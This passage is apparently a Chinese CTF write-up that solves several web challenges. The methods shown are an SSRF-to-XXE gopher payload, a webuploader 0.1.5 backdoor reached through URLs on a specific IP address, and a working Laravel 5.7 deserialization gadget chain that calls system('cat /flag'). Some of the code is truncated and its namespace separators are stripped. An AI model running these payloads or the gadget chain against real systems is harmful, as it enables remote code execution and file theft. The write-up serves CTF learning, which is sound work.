    #“这不是一样的吗....咋就md5不一样了.......”
    #
    #找出来到底哪里出了问题，就可以看这道web题目了
    //main.php
    object;
            $m = $this->method;
            $v = $this->variable;
            $o->$m();
            global $$v;
            $answer = file_get_contents('flag.php');
            ob_end_clean();
        }
    }
    class B
    {
        function read()
        {
            ob_start();
            global $answer;
            echo $answer;
        }
    }
    if($_SERVER["REMOTE_ADDR"] !== "127.0.0.1"){
    die('show me your identify');
    }
    if (isset($_GET['‬'])) {
        unserialize($_GET['‬'])->CaptureTheFlag();
    } else {
        die('you do not pass the misc');
    }
根据这里hints.php的内容提示，win10的计算器鼠标直接复制后，会在数字的前后加上两个不可见的unicode字符%e2%80%ad和%e2%80%ac，在这里的`unserialize($_GET['‬'])`部分，测试后发现可以用`%e2%80%ac=123`传参内容。  
到这一步按照预期应该是利用两个类的反序列化操作去想办法读取flag.txt内容了，但是其实回过头看看，xxe.php已经能够任意文件读取了不是吗？这里main.php的意义更像是告诉我们flag就是在flag.php中，因此直接构造payload用XXE读取flag……利用前面复写的方式能够绕过flag的黑名单限制！
    gopher://127.0.0.1:80/_POST /xxe.php HTTP/1.1%250d%250aHost:127.0.0.1:80%250d%250aContent-Type:application/x-www-form-urlencoded%250d%250aContent-Length:149%250d%250a%250d%250adata=]>%252526f;
得到flag内容
    0。接着直接访问hints中的目录路径，发现是一个一毛一样的页面，经过测试发现同样不能登录，但是差异在于源码中的`lib`目录在刚刚的`/`下访问是404，但是在hints的路径下，是存在的。  
于是继续审计lib下的内容，主要是一些插件，比较瞩目的是其中的webuploader 0.1.5和ueditor，测试后发现webuploader
0.1.5存在漏洞，漏洞详情可以参考：  
利用该漏洞后相应中返回了一段新的提示：
访问同级目录下的文件后，直接利用该后门…
    http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php
    http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag
## 0x04 laravel
这道题稍微比较硬核，但是如果对laravel找pop链比较熟悉应该也不算很难。题目给了部署网站的源码，是基于Laravel
5.7的框架。题目只有一个路由，即一个反序列化点：
下面的事就是去找pop链了，一开始果断祭出（白嫖方法）最强法宝——其他人对laravel5.7和5.8的pop链，不过逐一试过去发现没有一个能用的…  
这基本可以确定出题人应该是做了手脚了，去查看了下几个pop链常用的入口点PendingBroadcast、PendingCommand，果然触发点被出题人干掉了…
        //PendingBroadcast
        /**
         * Handle the object's destruction.
         *
         * @return void
         */
        public function __destruct()
        {
            return "no here!";
        }
        //PendingCommand
        /**
         * Handle the object's destruction.
         *
         * @return void
         */
        public function __destruct()
        {
            if ($this->hasExecuted) {
                return;
            }
        }
    }
缓过神来之后，默默拿出PhpStorm开始自个儿再慢慢找了…  
从析构函数开始逐个排查，经过漫长的寻觅后终于确定到一个能用的入口点
    SymfonyComponentRoutingLoaderConfiguratorImportConfigurator
这个类的析构函数中的函数调用形式就很美好，而且$this->parent和$this->route可控，只要再找到一个函数执行点，理想状态是在__call()魔术方法中
    public function __destruct()
        {
            $this->parent->addCollection($this->route);
        }
继续按照
**call()魔术方法寻觅，找到了`FakerGenerator`，这个类的**call()函数中调用format，而format中就有我们需要的call_user_func_array！
    public function format($formatter, $arguments = array())
        {
            return call_user_func_array($this->getFormatter($formatter), $arguments);
        }
    public function __call($method, $attributes)
        {
            return $this->format($method, $attributes);
        }
直接写EXP：
    parent = $parent;
                $this->route = $route;
            }
        }
    }
    namespace Faker{
        class Generator{
            protected $providers = array();
            protected $formatters = array();
            public function __construct($formatters)
            {
                $this->formatters = $formatters;
            }
        }
    }
    namespace{
        $a = new FakerGenerator(array('addCollection'=>'system'));
        $b = new SymfonyComponentRoutingLoaderConfiguratorImportConfigurator($a, 'cat /flag');
        echo urlencode(serialize($b));
    }
    ?>
最后拿到flag内容：
## 0x05 总结
Web题总体不难，还有一道zzm’s blog没有做出来，总之还是挺有收获的，感谢阅读~